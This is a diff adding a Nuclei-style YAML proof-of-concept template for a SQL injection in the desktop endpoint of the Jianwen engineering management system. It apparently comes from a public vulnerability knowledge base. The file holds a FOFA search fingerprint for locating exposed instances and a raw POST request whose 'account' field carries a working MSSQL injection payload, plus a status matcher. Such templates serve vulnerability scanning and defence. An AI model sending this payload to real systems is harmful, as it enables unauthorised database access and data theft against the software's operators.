@@ -1,0 +1,28 @@
+id: poc-abgzxgt210duyz7x
+info:
+  name: 建文工程管理系统 desktop 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/abgzxgt210duyz7x'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: abgzxgt210duyz7x
+    fofa: body="Login/QRLogin.ashx"
+http:
+- raw:
+  - 'POST /SysFrame4/Desktop.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    account=1''+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''233'')),3,32))<0--&method=isChangePwd&pwd='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
